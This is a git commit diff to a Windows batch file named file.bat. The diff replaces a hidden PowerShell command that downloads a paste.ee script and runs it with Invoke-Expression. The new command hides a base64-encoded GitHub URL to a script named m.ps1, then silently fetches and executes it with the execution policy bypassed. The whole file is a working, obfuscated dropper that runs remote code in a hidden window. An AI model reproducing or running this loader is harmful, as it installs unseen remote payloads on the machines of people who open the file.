de416527dce559ad2a20d550e5799f09b6d8a3bd
k53xupn43 <digi2ocean@gmail.com>
2025-07-19 03:13:48 +0600

    Update file.bat

--- file.bat
+++ file.bat
@@ -1,5 +1,11 @@
 @echo off
+setlocal
 
-powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
+:: Base64-encoded URL of the PowerShell payload
+set "encodedURL=aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2s1M3h1cG40My9pOTY1NjUyZi9yZWZzL2hlYWRzL21haW4vbS5wczE="
 
-"Invoke-Expression (Invoke-WebRequest -Uri 'https://paste.ee/d/i2aOdBuB/0').Content"
+:: Run obfuscated PowerShell command silently
+powershell -NoP -W Hidden -Exec Bypass -Command ^
+ "$u=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%encodedURL%'));$i='Invoke-Expression';$w='Invoke-RestMethod';&($i) (&($w) ($u))"
+
+endlocal
